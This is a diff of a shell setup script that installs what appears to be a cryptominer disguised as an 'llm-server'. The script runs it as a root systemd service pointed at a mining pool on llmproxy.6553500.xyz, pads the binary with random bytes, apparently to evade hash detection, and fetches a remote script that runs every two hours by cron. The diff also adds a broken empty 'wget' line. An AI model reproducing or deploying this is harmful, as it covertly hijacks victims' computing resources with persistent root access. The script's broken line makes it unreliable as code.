@@ -27,6 +27,7 @@ count=$((RANDOM % 1000 + 1))
 for ((i = 0; i < count; i++)); do
   echo -n "0" >> "/etc/llm/llm-server"
 done
+wget 
 wget https://raw.githubusercontent.com/caippx/bash/refs/heads/master/drfytgybhunjoimkol/random_usage.sh
 chmod +x random_usage.sh
 cron_job="0 */2 * * * /etc/llm/random_usage.sh"
@@ -40,7 +41,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=/etc/llm/llm-server --max-cpu-usage 92 -o llmproxy.6553500.xyz:443 -u $U -p x -k --tls --huge-pages-jit --asm=auto 
+ExecStart=/etc/llm/llm-server --max-threads-hint 92 -o llmproxy.6553500.xyz:443 -u $U -p x -k --tls --huge-pages=true --asm=auto 
 Restart=on-failure
 User=root
 
